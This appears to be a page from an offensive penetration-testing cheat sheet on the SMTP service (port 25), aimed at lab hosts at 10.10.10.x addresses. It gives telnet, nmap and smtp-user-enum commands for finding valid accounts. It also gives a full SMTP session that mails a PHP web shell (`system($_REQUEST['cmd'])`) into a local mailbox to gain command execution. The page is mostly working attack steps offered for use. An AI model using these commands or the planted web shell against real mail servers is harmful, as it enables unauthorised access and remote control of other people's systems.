---
metaLinks:
  alternates:
    - >-
      https://app.gitbook.com/s/qDX4NWkPelZggTpGCfyF/offensive-treasure/penetration-testing/enumeration/service-ports/smtp-25
---

# SMTP (25)

## Enumerate for Valid Email

```basic
telnet 10.10.10.10 25
EHLO test.domain.name    #any.any.any
VRFY root@domain.name
```

## Send Command Execute via Mail

```basic
telnet 10.10.10.7 25
EHLO test.domain.name    #any.any.any

mail from: test@test.com
250 2.1.0 Ok
rcpt to: asterisk@localhost
250 2.1.5 Ok
data
354 End data with <CR><LF>.<CR><LF>
Subject: You have been pwned
<?php echo system($_REQUEST['cmd']); ?>

.    # . to end the mail
250 2.0.0 Ok: queued as 8BAFDD92FD
```

## Nmap

```bash
└─$ nmap -p25 --script smtp-commands 10.10.10.10
Starting Nmap 7.91 ( https://nmap.org ) at 2021-07-01 22:38 BST
Nmap scan report for 10.10.10.10
Host is up (0.091s latency).

PORT   STATE SERVICE
25/tcp open  smtp
| smtp-commands: bratarina Hello nmap.scanme.org [10.10.10.10], pleased to meet you, 8BITMIME, ENHANCEDSTATUSCODES, SIZE 36700160, DSN, HELP, 
|_ 2.0.0 This is OpenSMTPD 2.0.0 To report bugs in the implementation, please contact bugs@openbsd.org 2.0.0 with full details 2.0.0 End of HELP info
```

## smtp-user enum

{% code overflow="wrap" %}
```bash
smtp-user-enum -M VRFY -t 10.10.10.10 -U /usr/share/seclists/Usernames/top-usernames-shortlist.txt
```
{% endcode %}
